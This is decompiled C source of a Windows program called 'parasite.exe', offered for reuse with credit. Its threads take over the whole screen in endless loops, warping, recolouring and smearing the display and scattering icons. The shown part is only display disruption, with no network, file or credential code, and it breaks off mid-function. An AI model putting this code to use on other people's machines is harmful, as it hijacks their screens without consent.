// parasite.exe source code copyright Red Wipet Do not use and say it is your own!!!!!! :3 only use if you credit the original cretor aka Red Wipet decompiler Maicnex

#include <windows.h>
#include <math.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

float *__fastcall sub_140001000(float *a1, int a2);
__int64 __fastcall sub_1400011F0(float *a1);
void __fastcall __noreturn StartAddress(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_140001A00(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_140001F50(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_1400026E0(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_140002F30(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_140003300(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_1400039E0(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_140004560(LPVOID lpThreadParameter);
void __fastcall __noreturn sub_140004AE0(LPVOID lpThreadParameter);
MMRESULT sub_140005660();
MMRESULT sub_140005830();
MMRESULT sub_140005990();
MMRESULT sub_140005B70();
MMRESULT sub_140005CE0();
MMRESULT sub_140005E50();
MMRESULT sub_140005FB0();
MMRESULT sub_140006110();
MMRESULT sub_140006270();
int __fastcall main(int argc, const char **argv, const char **envp);
// void __cdecl _security_check_cookie(uintptr_t StackCookie);
__int64 __fastcall UserMathErrorFunction(struct _exception *a1);
void sub_140006E60();
char sub_140006E70();
void *sub_140006E78();
void *sub_140006E80();
void *sub_140006EB0();
void *sub_140006EB8();
void sub_140006EC0();
void sub_1400070DC();
void __fastcall sub_140007118();
// void *__cdecl memset(void *, int Val, size_t Size);
// double __cdecl cos(double X);
// double __cdecl fmod(double X, double Y);
// float __cdecl fmodf(float X, float Y);
// double __cdecl sin(double X);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *GetTextExtentPointW)(HDC hdc, LPCWSTR lpString, int c, LPSIZE lpsz);
// extern BOOL (__stdcall *BitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// extern HBITMAP (__stdcall *CreateCompatibleBitmap)(HDC hdc, int cx, int cy);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern HBITMAP (__stdcall *CreateDIBSection)(HDC hdc, const BITMAPINFO *pbmi, UINT usage, void **ppvBits, HANDLE hSection, DWORD offset);
// extern HDC (__stdcall *CreateCompatibleDC)(HDC hdc);
// extern BOOL (__stdcall *StretchBlt)(HDC hdcDest, int xDest, int yDest, int wDest, int hDest, HDC hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, DWORD rop);
// extern BOOL (__stdcall *PlgBlt)(HDC hdcDest, const POINT *lpPoint, HDC hdcSrc, int xSrc, int ySrc, int width, int height, HBITMAP hbmMask, int xMask, int yMask);
// extern HFONT (__stdcall *CreateFontW)(int cHeight, int cWidth, int cEscapement, int cOrientation, int cWeight, DWORD bItalic, DWORD bUnderline, DWORD bStrikeOut, DWORD iCharSet, DWORD iOutPrecision, DWORD iClipPrecision, DWORD iQuality, DWORD iPitchAndFamily, LPCWSTR pszFaceName);
// extern LONG (__stdcall *GetBitmapBits)(HBITMAP hbit, LONG cb, LPVOID lpvBits);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern BOOL (__stdcall *TextOutW)(HDC hdc, int x, int y, LPCWSTR lpString, int c);
// extern COLORREF (__stdcall *SetTextColor)(HDC hdc, COLORREF color);
// extern LONG (__stdcall *SetBitmapBits)(HBITMAP hbm, DWORD cb, const void *pvBits);
// extern int (__stdcall *SetBkMode)(HDC hdc, int mode);
// extern int (__stdcall *SetStretchBltMode)(HDC hdc, int mode);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern HWND (__stdcall *GetConsoleWindow)();
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern BOOL (__stdcall *GetWindowRect)(HWND hWnd, LPRECT lpRect);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern BOOL (__stdcall *InvalidateRect)(HWND hWnd, const RECT *lpRect, BOOL bErase);
// extern HWND (__stdcall *GetDesktopWindow)();
// extern HDC (__stdcall *GetWindowDC)(HWND hWnd);
// extern HICON (__stdcall *LoadIconW)(HINSTANCE hInstance, LPCWSTR lpIconName);
// extern BOOL (__stdcall *DrawIcon)(HDC hDC, int X, int Y, HICON hIcon);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern MMRESULT (__stdcall *waveOutWrite)(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh);
// extern MMRESULT (__stdcall *waveOutUnprepareHeader)(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh);
// extern MMRESULT (__stdcall *waveOutPrepareHeader)(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh);
// extern MMRESULT (__stdcall *waveOutClose)(HWAVEOUT hwo);
// extern MMRESULT (__stdcall *waveOutOpen)(LPHWAVEOUT phwo, UINT uDeviceID, LPCWAVEFORMATEX pwfx, DWORD_PTR dwCallback, DWORD_PTR dwInstance, DWORD fdwOpen);
// extern int (__cdecl *rand)();
__int128 xmmword_140008560 = 0x101000001010000010100000101LL; // weak
__int128 xmmword_140008570 = 0xFFFFFF00FFFFFF00FFFFFF00FFFFFFLL; // weak
void (*qword_140008AD8[2])(void) = { NULL, NULL }; // weak
void (*qword_140008AE8)(void) = NULL; // weak
int dword_14000A018 = 1; // weak
union _SLIST_HEADER stru_14000A610; // weak
_UNKNOWN unk_14000A620; // weak
_UNKNOWN unk_14000A628; // weak
int dword_14000A630; // weak
__int64 qword_14000A640; // weak
__int64 qword_14000A648; // weak
float flt_14000A650[4096]; // weak
_UNKNOWN unk_14000E650; // weak
_UNKNOWN unk_14000E658; // weak


//----- (0000000140001000) ----------------------------------------------------
float *__fastcall sub_140001000(float *a1, int a2)
{
  float v2; // xmm8_4
  float v3; // xmm7_4
  float v4; // xmm4_4
  float v5; // xmm1_4
  float v6; // xmm3_4
  float v7; // xmm0_4
  float v8; // xmm6_4
  float v9; // xmm2_4
  float v10; // xmm5_4
  float v11; // xmm12_4
  float v12; // xmm9_4
  float v13; // xmm11_4
  float v14; // xmm10_4
  float *result; // rax

  v2 = (float)BYTE2(a2) / 255.0;
  v3 = (float)BYTE1(a2) / 255.0;
  v4 = (float)(unsigned __int8)a2 / 255.0;
  v5 = fminf(v2, v3);
  if ( v4 <= v5 )
    v5 = (float)(unsigned __int8)a2 / 255.0;
  v6 = fmaxf(v2, v3);
  if ( v6 <= v4 )
    v6 = (float)(unsigned __int8)a2 / 255.0;
  v7 = v6 + v5;
  v8 = v6 - v5;
  v9 = 0.0;
  v10 = 0.0;
  v11 = (float)(v6 + v5) * 0.5;
  if ( (float)(v6 - v5) != 0.0 )
  {
    if ( v11 >= 0.5 )
      v7 = (float)(2.0 - v6) - v5;
    v10 = v8 / v7;
    v12 = (float)((float)((float)(v6 - v4) / 6.0) + (float)(v8 * 0.5)) / v8;
    v13 = (float)((float)((float)(v6 - v2) / 6.0) + (float)(v8 * 0.5)) / v8;
    v14 = (float)((float)((float)(v6 - v3) / 6.0) + (float)(v8 * 0.5)) / v8;
    if ( v2 == v6 )
    {
      v9 = v12 - v14;
    }
    else if ( v3 == v6 )
    {
      v9 = (float)(v13 + 0.33333334) - v12;
    }
    else
    {
      if ( v4 != v6 )
        goto LABEL_18;
      v9 = (float)(v14 + 0.66666669) - v13;
    }
    if ( v9 < 0.0 )
      v9 = v9 + 1.0;
    if ( v9 > 1.0 )
      v9 = v9 + -1.0;
  }
LABEL_18:
  result = a1;
  a1[2] = v11;
  *a1 = v9;
  a1[1] = v10;
  return result;
}

//----- (00000001400011F0) ----------------------------------------------------
__int64 __fastcall sub_1400011F0(float *a1)
{
  float v1; // xmm3_4
  float v2; // xmm4_4
  float v3; // xmm2_4
  float v4; // xmm5_4
  float v5; // xmm2_4
  float v6; // xmm7_4
  float v7; // xmm6_4
  float v8; // xmm1_4
  unsigned int v10; // [rsp+30h] [rbp+8h]

  v1 = a1[2];
  v2 = v1;
  v3 = a1[1];
  v4 = v1;
  if ( v1 > 0.5 )
    v5 = (float)(v1 + v3) - (float)(v1 * v3);
  else
    v5 = (float)(v3 + 1.0) * v1;
  if ( v5 > 0.0 )
  {
    v6 = *a1 * 6.0;
    v7 = (float)(v1 + v1) - v5;
    v8 = (float)((float)((float)(v5 - v7) / v5) * v5) * (float)(v6 - (float)(int)v6);
    switch ( (int)v6 )
    {
      case 0:
        v2 = v8 + v7;
        v4 = (float)(v1 + v1) - v5;
        goto LABEL_12;
      case 1:
        v1 = v5 - v8;
        v2 = v5;
        v4 = v7;
        break;
      case 2:
        v1 = (float)(v1 + v1) - v5;
        v2 = v5;
        v4 = v8 + v7;
        break;
      case 3:
        v1 = (float)(v1 + v1) - v5;
        v2 = v5 - v8;
        v4 = v5;
        break;
      case 4:
        v1 = v8 + v7;
        v2 = v7;
        v4 = v5;
        break;
      case 5:
        v2 = (float)(v1 + v1) - v5;
        v4 = v5 - v8;
LABEL_12:
        v1 = v5;
        break;
      default:
        break;
    }
  }
  BYTE2(v10) = (int)(float)(v1 * 255.0);
  BYTE1(v10) = (int)(float)(v2 * 255.0);
  LOBYTE(v10) = (int)(float)(v4 * 255.0);
  return v10;
}

//----- (0000000140001340) ----------------------------------------------------
void __fastcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  HBITMAP CompatibleBitmap; // rax
  HBITMAP v2; // r13
  int wSrc; // r12d
  int hSrc; // r15d
  HDC DC; // r14
  HDC CompatibleDC; // rsi
  HBITMAP v7; // rax
  HDC v8; // rbx
  HDC v9; // rax
  int v10; // r15d
  int v11; // r12d
  HDC v12; // rdi
  HBITMAP v13; // rax
  int v14; // edi
  double v15; // xmm6_8
  HDC v16; // rsi
  HDC v17; // r13
  int v18; // r14d
  double v19; // xmm0_8
  int v20; // ebx
  double v21; // xmm0_8
  int i; // edi
  double v23; // xmm0_8
  int v24; // ebx
  double v25; // xmm0_8
  HDC v26; // rbx
  HDC v27; // r13
  int v28; // esi
  int v29; // eax
  int v30; // edi
  HBITMAP v31; // rax
  HDC v32; // rbx
  __int64 j; // r9
  HWND DesktopWindow; // rax
  HDC WindowDC; // rsi
  int v36; // ebx
  int v37; // edi
  int v38; // ebx
  int v39; // ebx
  HICON IconW; // rax
  int SystemMetrics; // [rsp+68h] [rbp-A0h]
  HDC hdc; // [rsp+70h] [rbp-98h]
  HDC hdcSrc; // [rsp+78h] [rbp-90h]
  void *v44; // [rsp+80h] [rbp-88h] BYREF
  void *ppvBits; // [rsp+88h] [rbp-80h] BYREF
  void *v46; // [rsp+90h] [rbp-78h] BYREF
  void *v47; // [rsp+98h] [rbp-70h] BYREF
  BITMAPINFO v48; // [rsp+A0h] [rbp-68h] BYREF
  BITMAPINFO pbmi; // [rsp+D0h] [rbp-38h] BYREF
  BITMAPINFO v50; // [rsp+100h] [rbp-8h] BYREF

  hdc = GetDC(0LL);
  SystemMetrics = GetSystemMetrics(0);
  LODWORD(v44) = GetSystemMetrics(1);
  hdcSrc = CreateCompatibleDC(hdc);
  CompatibleBitmap = CreateCompatibleBitmap(hdc, SystemMetrics, (int)v44);
  SelectObject(hdcSrc, CompatibleBitmap);
  pbmi.bmiHeader.biSize = 44;
  ppvBits = 0LL;
  pbmi.bmiHeader.biWidth = SystemMetrics;
  pbmi.bmiHeader.biHeight = (int)v44;
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  v2 = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0LL, 0);
  SelectObject(hdcSrc, v2);
  wSrc = GetSystemMetrics(0);
  hSrc = GetSystemMetrics(1);
  GetDC(0LL);
  DC = GetDC(0LL);
  CreateCompatibleDC(DC);
  CompatibleDC = CreateCompatibleDC(DC);
  CreateCompatibleBitmap(DC, wSrc, hSrc);
  v7 = CreateCompatibleBitmap(DC, wSrc, hSrc);
  SelectObject(CompatibleDC, v7);
  SetStretchBltMode(CompatibleDC, 3);
  SetStretchBltMode(DC, 3);
  StretchBlt(CompatibleDC, 0, 0, wSrc / 3, hSrc / 3, DC, 0, 0, wSrc, hSrc, 0x999999u);
  StretchBlt(DC, 0, 0, wSrc, hSrc, CompatibleDC, 0, 0, wSrc / 3, hSrc / 3, 0x999999u);
  v8 = GetDC(0LL);
  v9 = CreateCompatibleDC(v8);
  v10 = SystemMetrics;
  v11 = (int)v44;
  v48.bmiHeader.biSize = 44;
  v12 = v9;
  v48.bmiHeader.biWidth = SystemMetrics;
  v48.bmiHeader.biHeight = (int)v44;
  memset(&v48.bmiHeader.biSizeImage, 0, 24);
  *(_QWORD *)&v48.bmiHeader.biPlanes = 2097153LL;
  v46 = 0LL;
  v13 = CreateDIBSection(v8, &v48, 0, &v46, 0LL, 0);
  SelectObject(v12, v13);
  v14 = 0;
  v15 = 0.0;
  v47 = 0LL;
  CreateDIBSection(hdc, &v48, 0, &v47, 0LL, 0);
  v16 = hdcSrc;
  SelectObject(hdcSrc, v2);
  GetDC(0LL);
  LODWORD(v8) = GetSystemMetrics(0);
  GetSystemMetrics(1);
  v17 = hdc;
  BitBlt(hdcSrc, 0, 0, SystemMetrics, (int)v44, hdc, 0, 0, 0xCC0020u);
  if ( (int)v8 < 15 )
  {
    while ( 1 )
    {
      InvalidateRect(0LL, 0LL, 0);
      InvalidateRect(0LL, 0LL, 0);
    }
  }
  GetDC(0LL);
  v18 = SystemMetrics + 10;
  while ( 1 )
  {
    BitBlt(v16, 0, 0, v10, v11, v17, 0, 0, 0xCC0020u);
    if ( v18 > 0 )
    {
      do
      {
        v19 = cos(v15 / 6.0);
        v20 = (int)sin(v19 * 3.141592025756836 + v15);
        v21 = cos(v15);
        BitBlt(v16, v14, 0, 1, v11, v16, v14, v20 - (int)(v21 * -10.0 * 3.141592025756836), 0xCC0020u);
        ++v14;
        v15 = v15 + 0.009999999776482582;
      }
      while ( v14 < v18 );
      v10 = SystemMetrics;
      for ( i = 0; i < v18; ++i )
      {
        v23 = cos(v15 / 6.0);
        v24 = (int)sin(v23 * 3.141592025756836 + v15);
        v25 = cos(v15);
        BitBlt(v16, 0, i, SystemMetrics, 1, v16, v24 - (int)(v25 * -20.0 * 3.141592025756836), i, 0xCC0020u);
        v15 = v15 + 0.009999999776482582;
      }
      v17 = hdc;
    }
    BitBlt(v17, 0, 0, v10, v11, v16, 0, 0, 0x1100A6u);
    v26 = GetDC(0LL);
    v27 = CreateCompatibleDC(v26);
    v28 = GetSystemMetrics(0);
    v29 = GetSystemMetrics(1);
    v50.bmiHeader.biSize = 44;
    memset(&v50.bmiHeader.biCompression, 0, 28);
    v30 = v29;
    *(_DWORD *)&v50.bmiHeader.biPlanes = 2097153;
    v50.bmiHeader.biWidth = v28;
    v44 = 0LL;
    v50.bmiHeader.biHeight = v29;
    v31 = CreateDIBSection(v26, &v50, 0, &v44, 0LL, 0);
    SelectObject(v27, v31);
    v32 = GetDC(0LL);
    BitBlt(v27, 0, 0, v28, v30, v32, 0, 0, 0xCC0020u);
    for ( j = 0LL; j < v28 * v30; *((_DWORD *)v44 + j++) %= 0xFFFFFFu )
      ;
    BitBlt(v32, 0, 0, v28, v30, v27, 0, 90, 0xCC0020u);
    BitBlt(v32, 0, 0, v28, v30, v27, 0, 90 - v30, 0xCC0020u);
    DesktopWindow = GetDesktopWindow();
    WindowDC = GetWindowDC(DesktopWindow);
    v36 = GetSystemMetrics(0);
    v37 = rand() % v36;
    v38 = GetSystemMetrics(1);
    v39 = rand() % v38;
    IconW = LoadIconW(0LL, (LPCWSTR)0x7F01);
    DrawIcon(WindowDC, v37, v39, IconW);
    v16 = hdcSrc;
    v14 = 0;
    v17 = hdc;
  }
}

//----- (0000000140001A00) ----------------------------------------------------
void __fastcall __noreturn sub_140001A00(LPVOID lpThreadParameter)
{
  HDC DC; // rbx
  HDC v2; // rsi
  int wSrc; // r15d
  int hSrc; // r14d
  int v5; // ebp
  HBITMAP v6; // rax
  int v7; // edi
  HDC v8; // rbx
  int v9; // r12d
  __int64 v10; // rax
  int v11; // ebx
  int v12; // esi
  __int64 v13; // r13
  __int64 v14; // rdi
  char *v15; // r15
  float v16; // xmm1_4
  float v17; // xmm2_4
  float v18; // xmm0_4
  float v19; // xmm3_4
  float v20; // xmm1_4
  float v21; // xmm0_4
  float v22; // xmm6_4
  float v23; // xmm7_4
  float v24; // xmm4_4
  float v25; // xmm6_4
  float v26; // xmm0_4
  float v27; // xmm1_4
  float v28; // xmm2_4
  float v29; // xmm4_4
  int v30; // eax
  float v31; // xmm3_4
  float v32; // xmm1_4
  float v33; // xmm5_4
  float v34; // xmm4_4
  HDC v35; // rbx
  int v36; // [rsp+60h] [rbp-138h]
  int v37; // [rsp+64h] [rbp-134h]
  int SystemMetrics; // [rsp+68h] [rbp-130h]
  __int64 v39; // [rsp+70h] [rbp-128h]
  HDC v40; // [rsp+78h] [rbp-120h]
  HDC CompatibleDC; // [rsp+80h] [rbp-118h]
  void *ppvBits; // [rsp+88h] [rbp-110h] BYREF
  BITMAPINFO pbmi; // [rsp+90h] [rbp-108h] BYREF

  GetSystemMetrics(0);
  GetSystemMetrics(1);
  DC = GetDC(0LL);
  CompatibleDC = CreateCompatibleDC(DC);
  v2 = CompatibleDC;
  SystemMetrics = GetSystemMetrics(0);
  wSrc = SystemMetrics;
  pbmi.bmiHeader.biSize = 44;
  hSrc = GetSystemMetrics(1);
  pbmi.bmiHeader.biWidth = SystemMetrics;
  v5 = 0;
  pbmi.bmiHeader.biHeight = hSrc;
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
  ppvBits = 0LL;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  v6 = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0LL, 0);
  SelectObject(CompatibleDC, v6);
  v7 = 0;
  v37 = 0;
  while ( 1 )
  {
    v8 = GetDC(0LL);
    v40 = v8;
    StretchBlt(v2, 0, 0, wSrc, hSrc, v8, 0, 0, wSrc, hSrc, 0xCC0020u);
    v9 = 0;
    if ( wSrc > 0 )
    {
      v10 = 0LL;
      v39 = 0LL;
      do
      {
        v11 = 0;
        if ( hSrc > 0 )
        {
          v12 = 0;
          v13 = 4LL * wSrc;
          v14 = v10;
          do
          {
            v15 = (char *)ppvBits;
            v16 = (float)(unsigned __int8)BYTE2(*(_DWORD *)((char *)ppvBits + v14)) / 255.0;
            v17 = (float)(unsigned __int8)BYTE1(*(_DWORD *)((char *)ppvBits + v14)) / 255.0;
            v18 = (float)(unsigned __int8)*(_DWORD *)((char *)ppvBits + v14) / 255.0;
            v19 = fminf(v16, v17);
            if ( v18 <= v19 )
              v19 = (float)(unsigned __int8)*(_DWORD *)((char *)ppvBits + v14) / 255.0;
            v20 = fmaxf(v16, v17);
            if ( v20 <= v18 )
              v20 = (float)(unsigned __int8)*(_DWORD *)((char *)ppvBits + v14) / 255.0;
            v21 = v20 + v19;
            v22 = 0.0;
            v23 = (float)(v20 + v19) * 0.5;
            if ( (float)(v20 - v19) != 0.0 )
            {
              if ( v23 >= 0.5 )
                v21 = (float)(2.0 - v20) - v19;
              v22 = (float)(v20 - v19) / v21;
            }
            v24 = fmodf((float)((float)(v11 / hSrc) * 0.1) + (float)((float)(v12 ^ v5) / 300000.0), 1.0);
            if ( v23 > 0.5 )
              v25 = (float)(v23 + v22) - (float)(v23 * v22);
            else
              v25 = (float)(v22 + 1.0) * v23;
            v26 = (float)(v20 + v19) * 0.5;
            v27 = v26;
            v28 = v23;
            if ( v25 > 0.0 )
            {
              v29 = v24 * 6.0;
              v30 = (int)v29;
              v31 = (float)(v23 + v23) - v25;
              v26 = v23;
              v32 = (float)((float)((float)(v25 - v31) / v25) * v25) * (float)(v29 - (float)(int)v29);
              v33 = v25 - v32;
              v34 = v32 + v31;
              v27 = v23;
              switch ( v30 )
              {
                case 0:
                  v27 = v34;
                  v28 = (float)(v23 + v23) - v25;
                  goto LABEL_25;
                case 1:
                  v26 = v33;
                  v27 = v25;
                  v28 = (float)(v23 + v23) - v25;
                  break;
                case 2:
                  v26 = (float)(v23 + v23) - v25;
                  v27 = v25;
                  v28 = v34;
                  break;
                case 3:
                  v26 = (float)(v23 + v23) - v25;
                  v27 = v33;
                  v28 = v25;
                  break;
                case 4:
                  v26 = v34;
                  v27 = (float)(v23 + v23) - v25;
                  v28 = v25;
                  break;
                case 5:
                  v27 = (float)(v23 + v23) - v25;
                  v28 = v33;
LABEL_25:
                  v26 = v25;
                  break;
                default:
                  break;
              }
            }
            v12 += v37;
            ++v11;
            v5 += v9;
            BYTE2(v36) = (int)(float)(v26 * 255.0);
            BYTE1(v36) = (int)(float)(v27 * 255.0);
            LOBYTE(v36) = (int)(float)(v28 * 255.0);
            *(_DWORD *)&v15[v14] = v36;
            v14 += v13;
          }
          while ( v11 < hSrc );
          v10 = v39;
          v5 = 0;
          wSrc = SystemMetrics;
        }
        v10 += 4LL;
        ++v9;
        v39 = v10;
      }
      while ( v9 < wSrc );
      v7 = v37;
      v8 = v40;
      v2 = CompatibleDC;
    }
    v37 = ++v7;
    StretchBlt(v8, 0, 0, wSrc, hSrc, v2, 0, 0, wSrc, hSrc, 0x660046u);
    ReleaseDC(0LL, v8);
    DeleteDC(v8);
    v35 = GetDC(0LL);
    BitBlt(v35, 0, 0, wSrc, hSrc, v35, -300, 0, 0x1100A6u);
    BitBlt(v35, 0, 0, wSrc, hSrc, v35, wSrc - 300, 0, 0xCC0020u);
    BitBlt(v35, 0, 0, wSrc, hSrc, v35, 0, -300, 0xCC0020u);
    BitBlt(v35, 0, 0, wSrc, hSrc, v35, 0, hSrc - 300, 0xCC0020u);
  }
}
// 140001DD5: variable 'v36' is possibly undefined

//----- (0000000140001F50) ----------------------------------------------------
void __fastcall __noreturn sub_140001F50(LPVOID lpThreadParameter)
{
  HDC v1; // rbx
  HDC v2; // rsi
  __int64 SystemMetrics; // r14
  int v4; // r12d
  int v5; // edi
  double v6; // xmm8_8
  HBITMAP v7; // rax
  int v8; // r13d
  int v9; // r15d
  float v10; // xmm13_4
  char *v11; // rcx
  __int64 v12; // rax
  int v13; // edi
  float v14; // xmm7_4
  char *v15; // rsi
  int v16; // r13d
  int v17; // r12d
  int v18; // edx
  float *v19; // rax
  int v20; // ebx
  __int64 v21; // xmm6_8
  double v22; // xmm0_8
  float v23; // xmm1_4
  int v24; // eax
  int x1; // edi
  double v26; // xmm0_8
  int v27; // ebx
  int y1; // ebx
  HWND DesktopWindow; // rbx
  HDC DC; // rdi
  HWND v31; // rbx
  HDC v32; // rdi
  HWND v33; // rbx
  HDC v34; // r15
  int v35; // edi
  HDC v36; // r13
  int v37; // r8d
  int v38; // r9d
  __int64 v39; // rbx
  int v40; // eax
  int v41; // r11d
  int v42; // [rsp+58h] [rbp-B0h]
  char *ho; // [rsp+60h] [rbp-A8h]
  HBITMAP hoa; // [rsp+60h] [rbp-A8h]
  int v45; // [rsp+68h] [rbp-A0h]
  HWND v46; // [rsp+70h] [rbp-98h]
  HDC hdc; // [rsp+78h] [rbp-90h]
  HDC CompatibleDC; // [rsp+80h] [rbp-88h]
  __int64 v49; // [rsp+88h] [rbp-80h] BYREF
  int v50; // [rsp+90h] [rbp-78h]
  float v51[4]; // [rsp+A8h] [rbp-60h] BYREF
  HGDIOBJ v52; // [rsp+B8h] [rbp-50h] BYREF
  void *ppvBits; // [rsp+C0h] [rbp-48h] BYREF
  int v54; // [rsp+C8h] [rbp-40h] BYREF
  int cy; // [rsp+CCh] [rbp-3Ch] BYREF
  struct tagRECT Rect; // [rsp+D0h] [rbp-38h] BYREF
  BITMAPINFO v57; // [rsp+E0h] [rbp-28h] BYREF
  BITMAPINFO pbmi; // [rsp+110h] [rbp+8h] BYREF
  POINT Point; // [rsp+140h] [rbp+38h] BYREF
  int v60; // [rsp+148h] [rbp+40h]
  int v61; // [rsp+14Ch] [rbp+44h]
  int v62; // [rsp+150h] [rbp+48h]
  int v63; // [rsp+154h] [rbp+4Ch]

  hdc = GetDC(0LL);
  v1 = hdc;
  CompatibleDC = CreateCompatibleDC(hdc);
  v2 = CompatibleDC;
  SystemMetrics = GetSystemMetrics(0);
  pbmi.bmiHeader.biSize = 44;
  v4 = GetSystemMetrics(1);
  v45 = v4;
  pbmi.bmiHeader.biHeight = v4;
  v42 = 0;
  pbmi.bmiHeader.biWidth = SystemMetrics;
  *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
  v5 = 0;
  ppvBits = 0LL;
  memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
  v6 = 0.0;
  v7 = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0LL, 0);
  SelectObject(CompatibleDC, v7);
  while ( 1 )
  {
    v8 = SystemMetrics + 10;
    BitBlt(v2, 0, 0, SystemMetrics, v4, v1, 0, 0, 0xCC0020u);
    v9 = 0;
    v10 = (float)v5 / 10.0;
    if ( v4 > 0 )
    {
      v11 = 0LL;
      v12 = 4 * SystemMetrics;
      ho = 0LL;
      do
      {
        v13 = 0;
        v14 = (float)v9;
        if ( (int)SystemMetrics > 0 )
        {
          v15 = v11;
          v16 = (int)(float)(flt_14000A650[(int)(float)((float)((float)((float)((float)(v14 / 25.0) + v10) + 1.570796)
                                                              / 6.2831841)
                                                      * 4096.0) & 0xFFF]
                           * -16.0);
          v17 = SystemMetrics * (v9 % (unsigned int)v4);
          do
          {
            v18 = *((_DWORD *)ppvBits + v17 + (v13 - v16) % (unsigned int)SystemMetrics);
            *((_BYTE *)ppvBits + (_QWORD)v15 + 2) = (int)(float)((float)((float)(unsigned __int8)v18 * 0.875)
                                                               + (float)((float)*((unsigned __int8 *)ppvBits
                                                                                + (_QWORD)v15)
                                                                       * 0.125));
            v19 = sub_140001000(v51, v18);
            v20 = *((_DWORD *)v19 + 2);
            v21 = *(_QWORD *)v19;
            v22 = fmod((float)((float)v13 + v14) + COERCE_FLOAT(*(_QWORD *)v19) + 0.02222222222222222, 1.0);
            v50 = v20;
            v23 = v22;
            *(float *)&v21 = v23;
            v49 = v21;
            v24 = sub_1400011F0((float *)&v49);
            ++v13;
            *(_DWORD *)((char *)ppvBits + (_QWORD)v15) = v24;
            v15 += 4;
          }
          while ( v13 < (int)SystemMetrics );
          v11 = ho;
          v4 = v45;
          v12 = 4 * SystemMetrics;
        }
        v11 += v12;
        ++v9;
        ho = v11;
      }
      while ( v9 < v4 );
      v8 = SystemMetrics + 10;
      v2 = CompatibleDC;
    }
    for ( x1 = 0; x1 < v8; ++x1 )
    {
      v26 = cos(v6 / 60.0);
      v27 = (int)(sin(v26 * 20.0 * 3.141592025756836 + v6 * 32.0 / 100.0) * 10.0);
      y1 = v27 - (int)(cos(v6) * -20.0 * 3.141592025756836);
      BitBlt(v2, x1, 0, 1, v4, v2, x1, y1, 0xCC0020u);
      BitBlt(v2, 0, x1, SystemMetrics, 1, v2, y1, x1, 0xCC0020u);
      v6 = v6 + 0.009999999776482582;
    }
    ++v42;
    BitBlt(hdc, 0, 0, SystemMetrics, v4, v2, 0, 0, 0xCC0020u);
    GetDC(0LL);
    GetSystemMetrics(0);
    GetSystemMetrics(1);
    DesktopWindow = GetDesktopWindow();
    GetWindowDC(DesktopWindow);
    DC = GetDC(0LL);
    GetWindowRect(DesktopWindow, &Rect);
    GetSystemMetrics(0);
    GetSystemMetrics(0);
    Point.y = Rect.top + 30;
    v61 = Rect.top + 30;
    v60 = Rect.right - 30;
    Point.x = Rect.left + 30;
    v62 = Rect.left + 30;
    v63 = Rect.bottom + 30;
    PlgBlt(DC, &Point, DC, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0LL, 0, 0);
    v31 = GetDesktopWindow();
    GetWindowDC(v31);
    v32 = GetDC(0LL);
    GetWindowRect(v31, &Rect);
    GetSystemMetrics(0);
    GetSystemMetrics(0);
    Point.x = Rect.left - 30;
    Point.y = Rect.top + 30;
    v60 = Rect.right - 30;
    v61 = Rect.top + 30;
    v62 = Rect.left - 30;
    v63 = Rect.bottom + 30;
    PlgBlt(v32, &Point, v32, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0LL, 0, 0);
    GetDC(0LL);
    v46 = GetDesktopWindow();
    v33 = v46;
    v54 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    v57.bmiHeader.biHeight = cy;
    v57.bmiHeader.biWidth = v54;
    v57.bmiHeader.biSize = 40;
    *(_DWORD *)&v57.bmiHeader.biPlanes = 1572865;
    memset(&v57.bmiHeader.biCompression, 0, 28);
    v34 = GetDC(0LL);
    v35 = 0;
    v36 = CreateCompatibleDC(v34);
    hoa = CreateDIBSection(v34, &v57, 0, &v52, 0LL, 0);
    SelectObject(v36, hoa);
